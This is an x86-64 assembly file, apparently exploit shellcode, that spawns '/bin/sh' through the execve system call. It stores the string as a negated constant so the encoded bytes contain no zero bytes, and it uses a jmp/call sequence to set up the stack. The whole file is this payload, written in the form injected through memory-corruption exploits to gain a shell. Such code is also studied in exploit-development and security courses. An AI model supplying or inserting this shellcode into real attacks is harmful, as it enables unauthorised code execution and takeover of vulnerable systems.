[SECTION .text]

global _start

_start:
        jmp stack_fix

open_shell:
        xor rax, rax ; zero out eax
        xor rcx, rcx
        xor rsi, rsi
        xor rdx, rdx
        
        mov rbx, 0xFF978CD091969DD1 ; negated '/bin/sh' to remove zeros
        neg rbx ;convert it to regular (non twos comp)
        push rbx
        push rsp
        pop rbx ;first arg done (pointer to program to call)
        
        xor rdx, rdx ;3rd ard, NULL pointer
        mov rdi, rsp
        
        push rdx
        push rdi
        push rsp
        pop rsi ;2nd arg
        
        mov al, 0x3b              ;execve is syscall 0x3b
        syscall
        ret

stack_fix:
        call open_shell
        ; do a call to generate a new stack.
